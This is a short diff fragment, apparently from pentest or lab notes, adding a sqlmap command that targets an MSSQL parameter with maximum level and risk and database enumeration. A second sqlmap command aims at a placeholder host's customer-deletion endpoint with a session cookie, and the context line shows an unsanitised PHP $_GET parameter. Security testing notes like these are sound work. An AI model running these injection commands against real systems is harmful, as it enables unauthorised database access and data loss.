@@ -20,6 +20,7 @@ $id = $_GET['id'];
 .
 .
 
+sqlmap -r requests.txt --dbms=mssql --technique=B --level 5 --risk 3 -p logintype --dbs --threads=1 --time-sec=1 --batch --flush-session
 sqlmap -u "http://x.x.x.x:8080/complain/process.php?action=deleteCust&cId=123" --cookie="PHPSESSID=dc3rin305r5pvqqp874k5r0li6"
         ___
        __H__
